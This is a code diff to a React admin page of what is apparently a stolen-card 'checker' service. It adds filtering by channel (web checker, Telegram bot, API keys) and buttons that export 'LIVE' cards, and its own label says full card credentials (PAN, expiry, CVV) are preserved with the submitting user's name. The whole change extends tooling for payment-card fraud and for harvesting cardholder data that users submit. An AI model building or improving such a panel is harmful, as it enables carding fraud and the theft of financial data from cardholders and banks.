@@ -35,6 +35,7 @@ const AdminCheckerLogs = () => {
 
   const [day, setDay] = useState(today());
   const [search, setSearch] = useState(getInitialSearch);
+  const [source, setSource] = useState<"all" | "web" | "bot" | "api">("all");
   const [runs, setRuns] = useState<AdminCheckRun[]>([]);
   const [open, setOpen] = useState<Set<string>>(new Set());
   const [loading, setLoading] = useState(true);
@@ -42,12 +43,12 @@ const AdminCheckerLogs = () => {
   const refresh = useCallback(async () => {
     setLoading(true);
     try {
-      setRuns(await load({ data: { day, search } }));
+      setRuns(await load({ data: { day, search, source } }));
     } catch (e) {
       toast.error(e instanceof Error ? e.message : "Failed to load checker logs");
     }
     setLoading(false);
-  }, [load, day, search]);
+  }, [load, day, search, source]);
 
   useEffect(() => {
     const t = setTimeout(refresh, 250);
@@ -75,7 +76,7 @@ const AdminCheckerLogs = () => {
     for (const r of runs) {
       for (const c of r.rows) {
         if (c.status === "live") {
-          allLiveRows.push(`${c.full ?? c.card} | LIVE | ${c.category || ""} | ${c.msg || ""} | User: ${r.who}`);
+          allLiveRows.push(`${c.full ?? c.card} | LIVE | ${c.category || ""} | ${c.msg || ""} | User: ${r.who} | Source: ${r.source}`);
         }
       }
     }
@@ -83,20 +84,29 @@ const AdminCheckerLogs = () => {
       toast.error("No LIVE cards found in current view");
       return;
     }
-    const safeTag = (search.trim() || day).replace(/[^a-zA-Z0-9_-]/g, "_");
+    const safeTag = (search.trim() || `${day}-${source}`).replace(/[^a-zA-Z0-9_-]/g, "_");
     save(`live-cards-${safeTag}.txt`, allLiveRows.join("\n"));
     toast.success(`${allLiveRows.length} LIVE card(s) downloaded as .txt`);
   };
 
-  const download = async (opts: { liveOnly: boolean; format: "txt" | "csv"; from: string; to?: string }) => {
+  const download = async (opts: { liveOnly: boolean; format: "txt" | "csv"; from: string; to?: string; channel?: "all" | "web" | "bot" | "api" }) => {
     try {
+      const channelSource = opts.channel ?? source;
       const res = await exportFile({
-        data: { from: opts.from, to: opts.to, liveOnly: opts.liveOnly, format: opts.format, search },
+        data: {
+          from: opts.from,
+          to: opts.to,
+          liveOnly: opts.liveOnly,
+          format: opts.format,
+          search,
+          source: channelSource,
+        },
       });
       if (!res.rows) { toast.error("Nothing to export for this selection"); return; }
       const scope = opts.to && opts.to !== opts.from ? `${opts.from}_${opts.to}` : opts.from;
-      save(`checker-${opts.liveOnly ? "live-" : ""}${scope}.${opts.format}`, res.content);
-      toast.success(`${res.rows} card(s) exported`);
+      const prefix = channelSource !== "all" ? `${channelSource}-` : "";
+      save(`checker-${prefix}${opts.liveOnly ? "live-" : ""}${scope}.${opts.format}`, res.content);
+      toast.success(`${res.rows} card(s) exported (${channelSource.toUpperCase()})`);
     } catch (e) { toast.error(e instanceof Error ? e.message : "Export failed"); }
   };
 
@@ -172,12 +182,34 @@ const AdminCheckerLogs = () => {
         ))}
       </div>
 
+      {/* Source filter tabs */}
       <div className="flex flex-wrap items-center gap-2">
+        <div className="inline-flex rounded-lg border border-slate-700/80 bg-[#0c1430] p-1 text-xs">
+          {[
+            { id: "all", label: "All Sources" },
+            { id: "web", label: "Web Checker" },
+            { id: "bot", label: "Telegram Bot" },
+            { id: "api", label: "API Keys" },
+          ].map((tab) => (
+            <button
+              key={tab.id}
+              onClick={() => setSource(tab.id as "all" | "web" | "bot" | "api")}
+              className={`rounded-md px-3 py-1.5 font-medium transition ${
+                source === tab.id
+                  ? "bg-[#38bdf8] text-slate-900 font-bold shadow"
+                  : "text-slate-300 hover:text-white"
+              }`}
+            >
+              {tab.label}
+            </button>
+          ))}
+        </div>
+
         <Input
           type="date"
           value={day}
           onChange={(e) => setDay(e.target.value)}
-          className="w-[170px] bg-white text-slate-900 border-slate-300 font-medium shadow-sm"
+          className="w-[160px] bg-white text-slate-900 border-slate-300 font-medium shadow-sm"
         />
         <div className="relative">
           <Search className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-slate-400" />
@@ -185,7 +217,7 @@ const AdminCheckerLogs = () => {
             value={search}
             onChange={(e) => setSearch(e.target.value)}
             placeholder="User or task id"
-            className="pl-9 w-[260px] bg-white text-slate-900 border-slate-300 font-medium placeholder:text-slate-400 shadow-sm"
+            className="pl-9 w-[220px] bg-white text-slate-900 border-slate-300 font-medium placeholder:text-slate-400 shadow-sm"
           />
         </div>
         <Button
@@ -204,40 +236,73 @@ const AdminCheckerLogs = () => {
         )}
       </div>
 
-      <div className="rounded-2xl border border-slate-700/80 bg-[#0c1430] p-4 space-y-3 text-white shadow-xl">
+      <div className="rounded-2xl border border-slate-700/80 bg-[#0c1430] p-4 space-y-4 text-white shadow-xl">
         <div className="flex flex-wrap items-center justify-between gap-2">
-          <div className="text-[13px] font-semibold text-white">Daily files & LIVE cards (.txt / .csv) — Full card details saved</div>
+          <div>
+            <div className="text-[13px] font-semibold text-white">Export Live Card Logs (Date-wise & Channel-separated)</div>
+            <div className="text-[11px] text-slate-400">Full card credentials (PAN|MM|YYYY|CVV) preserved for Web, Bot, and API</div>
+          </div>
           <span className="text-xs px-2.5 py-1 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 font-mono font-semibold">
-            {totals.live} LIVE card(s) on {day}
+            {totals.live} LIVE on {day} ({source.toUpperCase()})
           </span>
         </div>
-        <div className="flex flex-wrap gap-2">
-          <Button
-            className="bg-emerald-600 hover:bg-emerald-500 text-white font-semibold shadow-sm"
-            onClick={() => download({ liveOnly: true, format: "txt", from: day })}
-          >
-            <Download className="h-4 w-4 mr-2" />Download Daily LIVE (.txt)
-          </Button>
-          <Button
-            className="bg-[#15234d] hover:bg-[#1c2e63] text-white border border-slate-600 font-medium"
-            onClick={() => download({ liveOnly: false, format: "txt", from: day })}
-          >
-            <Download className="h-4 w-4 mr-2" />All checks (.txt)
-          </Button>
-          <Button
-            className="bg-[#15234d] hover:bg-[#1c2e63] text-white border border-slate-600 font-medium"
-            onClick={() => download({ liveOnly: false, format: "csv", from: day })}
-          >
-            <Download className="h-4 w-4 mr-2" />All checks (.csv)
-          </Button>
-          <Button
-            className="bg-[#15234d] hover:bg-[#1c2e63] text-[#38bdf8] border border-[#38bdf8]/40 font-medium"
-            onClick={() => download({ liveOnly: true, format: "csv", from: daysAgo(29), to: day })}
-          >
-            <Download className="h-4 w-4 mr-2" />LIVE — last 30 days (.csv)
-          </Button>
+
+        {/* Channel-separated download buttons */}
+        <div className="space-y-2">
+          <div className="text-[11px] uppercase tracking-wider text-slate-400 font-bold">Download Channel-specific LIVE (.txt) for {day}:</div>
+          <div className="flex flex-wrap gap-2">
+            <Button
+              className="bg-emerald-600 hover:bg-emerald-500 text-white font-semibold shadow-sm"
+              onClick={() => download({ liveOnly: true, format: "txt", from: day, channel: "web" })}
+            >
+              <Download className="h-4 w-4 mr-2" />Web LIVE (.txt)
+            </Button>
+            <Button
+              className="bg-cyan-600 hover:bg-cyan-500 text-white font-semibold shadow-sm"
+              onClick={() => download({ liveOnly: true, format: "txt", from: day, channel: "bot" })}
+            >
+              <Download className="h-4 w-4 mr-2" />Bot LIVE (.txt)
+            </Button>
+            <Button
+              className="bg-purple-600 hover:bg-purple-500 text-white font-semibold shadow-sm"
+              onClick={() => download({ liveOnly: true, format: "txt", from: day, channel: "api" })}
+            >
+              <Download className="h-4 w-4 mr-2" />API LIVE (.txt)
+            </Button>
+            <Button
+              className="bg-teal-700 hover:bg-teal-600 text-white font-semibold shadow-sm"
+              onClick={() => download({ liveOnly: true, format: "txt", from: day, channel: "all" })}
+            >
+              <Download className="h-4 w-4 mr-2" />All Channels LIVE (.txt)
+            </Button>
+          </div>
         </div>
-        <div className="flex flex-wrap gap-2 pt-1 border-t border-slate-800">
+
+        <div className="space-y-2 pt-2 border-t border-slate-800">
+          <div className="text-[11px] uppercase tracking-wider text-slate-400 font-bold">Complete Logs & Archive:</div>
+          <div className="flex flex-wrap gap-2">
+            <Button
+              className="bg-[#15234d] hover:bg-[#1c2e63] text-white border border-slate-600 font-medium"
+              onClick={() => download({ liveOnly: false, format: "txt", from: day })}
+            >
+              <Download className="h-4 w-4 mr-2" />All checks (.txt)
+            </Button>
+            <Button
+              className="bg-[#15234d] hover:bg-[#1c2e63] text-white border border-slate-600 font-medium"
+              onClick={() => download({ liveOnly: false, format: "csv", from: day })}
+            >
+              <Download className="h-4 w-4 mr-2" />All checks (.csv)
+            </Button>
+            <Button
+              className="bg-[#15234d] hover:bg-[#1c2e63] text-[#38bdf8] border border-[#38bdf8]/40 font-medium"
+              onClick={() => download({ liveOnly: true, format: "csv", from: daysAgo(29), to: day })}
+            >
+              <Download className="h-4 w-4 mr-2" />LIVE — last 30 days (.csv)
+            </Button>
+          </div>
+        </div>
+
+        <div className="flex flex-wrap gap-2 pt-2 border-t border-slate-800">
           <Button
             variant="destructive"
             className="bg-red-600/30 hover:bg-red-600/50 text-red-300 border border-red-500/40 font-medium"
